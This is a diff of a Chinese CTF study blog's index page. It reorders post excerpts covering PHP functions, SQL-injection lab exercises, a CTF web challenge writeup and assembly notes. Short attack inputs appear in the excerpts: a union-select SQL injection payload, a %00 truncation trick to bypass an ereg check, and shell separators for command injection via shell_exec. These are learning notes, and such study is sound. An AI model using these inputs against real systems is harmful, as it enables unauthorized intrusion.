@@ -250,7 +250,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/04/ctf中遇到的php函数/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/16/平台题目wp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="hhd">
@@ -269,7 +269,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/11/04/ctf中遇到的php函数/" itemprop="url">ctf中遇到的php函数</a></h1>
+                <a class="post-title-link" href="/2017/11/16/平台题目wp/" itemprop="url">平台题目wp</a></h1>
         
 
         <div class="post-meta">
@@ -281,8 +281,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-04T20:06:03+08:00">
-                2017-11-04
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-16T13:14:16+08:00">
+                2017-11-16
               </time>
             
 
@@ -321,10 +321,7 @@
       
         
           
-            <p>最近写web题目，对php又感觉生疏了。<br>php函数是web题目的重点，所以我打算记录下每次的函数。</p>
-<p>1.implode(separator,array)<br>返回由数组元素组合成的字符串<br>separator 可选。规定数组元素之间放置的内容。默认是 “”（空字符串)<br>array 必需。要组合为字符串的数组</p>
-<p>2.preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )<br>搜索subject与pattern给定的正则表达式的一个匹配，前两个参数比较重要<br>pattern：要搜索的模式，字符串类型<br>subject：输入字符串<br>matches：如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推<br>。。</p>
-
+            
           
         
       
@@ -372,7 +369,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/10/15/ctf-web-7/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/04/ctf中遇到的php函数/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="hhd">
@@ -391,7 +388,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/10/15/ctf-web-7/" itemprop="url">ctf.web.7</a></h1>
+                <a class="post-title-link" href="/2017/11/04/ctf中遇到的php函数/" itemprop="url">ctf中遇到的php函数</a></h1>
         
 
         <div class="post-meta">
@@ -403,8 +400,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-15T14:58:26+08:00">
-                2017-10-15
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-04T20:06:03+08:00">
+                2017-11-04
               </time>
             
 
@@ -413,6 +410,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/php/" itemprop="url" rel="index">
+                    <span itemprop="name">php</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -443,7 +462,11 @@
       
         
           
-            
+            <p>最近写web题目，对php又感觉生疏了。<br>php函数是web题目的重点，所以我打算记录下每次的函数。</p>
+<p>1.implode(separator,array)<br>返回由数组元素组合成的字符串<br>separator 可选。规定数组元素之间放置的内容。默认是 “”（空字符串)<br>array 必需。要组合为字符串的数组</p>
+<p>2.preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )<br>搜索subject与pattern给定的正则表达式的一个匹配，前两个参数比较重要<br>pattern：要搜索的模式，字符串类型<br>subject：输入字符串<br>matches：如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推<br>。。</p>
+<p>3.shell_exec<br>当php源码里面有这个服务，可以试着注入。<br>; &amp;&amp; || |<br>;表示先后执行  &amp;&amp;表示先</p>
+
           
         
       
@@ -585,728 +608,6 @@
         
           
             <p>与第一篇的返回错误有些许不同，仔细看发现程序并没有将id用引号引起，所以是整数类型。<br>其余都与第一篇一样。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="hhd">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hhd">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/20/sql-6/" itemprop="url">好玩的sql第六篇</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
-                2017-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sql-fun/" itemprop="url" rel="index">
-                    <span itemprop="name">sql.fun</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>不一样的就是id=1”<br>其余与第五篇一毛一样</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/汇编语言学习/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="hhd">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hhd">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/20/汇编语言学习/" itemprop="url">汇编语言学习</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
-                2017-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/汇编语言/" itemprop="url" rel="index">
-                    <span itemprop="name">汇编语言</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>8086有20位地址总线，却只能传送16位地址，所以使用逻辑地址（段地址：偏移量）来表示，充分利用20位地址总线。</p>
-<blockquote>
-<p>物理地址=段地址*16+偏移量</p>
-</blockquote>
-<p>内存并没有分段，只是CPU将其分段。一个段最大长度为64K。也就是允许0~FFFFH的偏移量。</p>
-<blockquote>
-<p>mov指令无法修改CS与IP，可以利用jmp来修改：jmp 段地址：偏移地址</p>
-</blockquote>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-4/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="hhd">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hhd">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/20/sql-4/" itemprop="url">好玩的sql第四篇</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
-                2017-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sql-fun/" itemprop="url" rel="index">
-                    <span itemprop="name">sql.fun</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>输入?id=1<br>显示正常</p>
-<p>输入？id=1’<br>显示正常</p>
-<p>输入?id=1”<br>发现异常，从错误反馈可知依然需要加)</p>
-<p>第一二三四篇告诉我们简单攻击也有多种情况，要全面。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/ctf-web-6/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="hhd">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hhd">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/20/ctf-web-6/" itemprop="url">ctf.web.6</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
-                2017-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cft-web/" itemprop="url" rel="index">
-                    <span itemprop="name">cft.web</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>先挂网址：<a href="http://ctf5.shiyanbar.com/web/more.php" target="_blank" rel="external">http://ctf5.shiyanbar.com/web/more.php</a><br>进去只是要输入passwd这个值<br>一头雾水，然后点击看代码<br>&lt;?php<br>if (isset ($_GET[‘password’])) {<br>    if (ereg (“^[a-zA-Z0-9]+$”, $_GET[‘password’]) === FALSE)<br>    {<br>        echo ‘</p><p>You password must be alphanumeric</p>‘;<br>    }<br>    else if (strlen($_GET[‘password’]) &lt; 8 &amp;&amp; $_GET[‘password’] &gt; 9999999)<br>    {<br>        if (strpos ($_GET[‘password’], ‘<em>-</em>‘) !== FALSE)<br>        {<br>            die(‘Flag: ‘ . $flag);<br>        }<br>        else<br>        {<br>            echo(‘<p><em>-</em> have not been found</p>‘);<br>        }<br>    }<br>    else<br>    {<br>        echo ‘<p>Invalid password</p>‘;<br>    }<br>}<br>?&gt;<br>就是几个if-else ，重点是那些函数的漏洞<br>ereg,后一个参数按照前一个参数那样子的形式就对了，可知我们只能输入字母和数字，但是…<br>接着是字数小于8这个比较容易，&gt;999999..什么的就用科学计数法，1e什么的都有提示<p></p>
-<h2 id="再接着需要有-这…我们就想到了c语言中的截断，但是-0不管用，后来看了答案知道用-00截断。然后就可以了…"><a href="#再接着需要有-这…我们就想到了c语言中的截断，但是-0不管用，后来看了答案知道用-00截断。然后就可以了…" class="headerlink" title="再接着需要有-这…我们就想到了c语言中的截断，但是\0不管用，后来看了答案知道用%00截断。然后就可以了…"></a>再接着需要有<em>-</em>这…我们就想到了c语言中的截断，但是\0不管用，后来看了答案知道用%00截断。然后就可以了…</h2>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-3/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="hhd">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="hhd">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/09/20/sql-3/" itemprop="url">好玩的sql第三篇</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
-                2017-09-20
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/sql-fun/" itemprop="url" rel="index">
-                    <span itemprop="name">sql.fun</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>第三篇与一二篇又有点类似，不过php写的形式有点不同，有些程序员花样就是多…</p>
-<p>同样输入?id=1’<br>以下是三次的对比错误返回：<br>1.Erreur de syntaxe près de ‘’1’’ LIMIT 0,1’ à la ligne 1<br>2.Erreur de syntaxe près de ‘’ LIMIT 0,1’ à la ligne 1<br>3.Erreur de syntaxe près de ‘’1’’) LIMIT 0,1’ à la ligne 1</p>
-<p>?id=1’) union select 1,2,3–+<br>与一二篇类似。</p>
 
           
         
@@ -1742,11 +1043,764 @@
 
 
     
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/汇编语言学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="hhd">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hhd">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/20/汇编语言学习/" itemprop="url">汇编语言学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
+                2017-09-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/汇编语言/" itemprop="url" rel="index">
+                    <span itemprop="name">汇编语言</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>8086有20位地址总线，却只能传送16位地址，所以使用逻辑地址（段地址：偏移量）来表示，充分利用20位地址总线。</p>
+<blockquote>
+<p>物理地址=段地址*16+偏移量</p>
+</blockquote>
+<p>内存并没有分段，只是CPU将其分段。一个段最大长度为64K。也就是允许0~FFFFH的偏移量。</p>
+<blockquote>
+<p>mov指令无法修改CS与IP，可以利用jmp来修改：jmp 段地址：偏移地址</p>
+</blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="hhd">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hhd">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/20/sql-4/" itemprop="url">好玩的sql第四篇</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
+                2017-09-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql-fun/" itemprop="url" rel="index">
+                    <span itemprop="name">sql.fun</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>输入?id=1<br>显示正常</p>
+<p>输入？id=1’<br>显示正常</p>
+<p>输入?id=1”<br>发现异常，从错误反馈可知依然需要加)</p>
+<p>第一二三四篇告诉我们简单攻击也有多种情况，要全面。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="hhd">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hhd">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/20/sql-6/" itemprop="url">好玩的sql第六篇</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
+                2017-09-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql-fun/" itemprop="url" rel="index">
+                    <span itemprop="name">sql.fun</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>不一样的就是id=1”<br>其余与第五篇一毛一样</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-tags" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/sql-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="hhd">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hhd">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/20/sql-3/" itemprop="url">好玩的sql第三篇</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
+                2017-09-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/sql-fun/" itemprop="url" rel="index">
+                    <span itemprop="name">sql.fun</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>第三篇与一二篇又有点类似，不过php写的形式有点不同，有些程序员花样就是多…</p>
+<p>同样输入?id=1’<br>以下是三次的对比错误返回：<br>1.Erreur de syntaxe près de ‘’1’’ LIMIT 0,1’ à la ligne 1<br>2.Erreur de syntaxe près de ‘’ LIMIT 0,1’ à la ligne 1<br>3.Erreur de syntaxe près de ‘’1’’) LIMIT 0,1’ à la ligne 1</p>
+<p>?id=1’) union select 1,2,3–+<br>与一二篇类似。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/20/pwn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="hhd">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hhd">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/09/20/pwn/" itemprop="url">pwn学习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-20T00:00:00+08:00">
+                2017-09-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="C与C-安全编码"><a href="#C与C-安全编码" class="headerlink" title="C与C++安全编码"></a>C与C++安全编码</h2><blockquote>
+<p>有关字符串的一些概念</p>
+</blockquote>
+<p><strong>字符串</strong><br>c语言中都是以数组存储字符串，以\0作为字符串结尾，低位地址是数组首元素地址，高位地址是数组末元素地址。<br><em>sizeof</em>  用来计算数组大小。但是对于数组与指针应用时，sizeof对同一个数组的大小计算不同。果然我们学的是基础的c语言，如果当时学仔细一点，就应该发现这个问题的。</p>
+<p><strong>宽字节</strong>简单来说就是大一点的字符，需要更多空间。</p>
+<p><strong>字符串字面值</strong>就是这个字符串的值，宽字符串前缀是L</p>
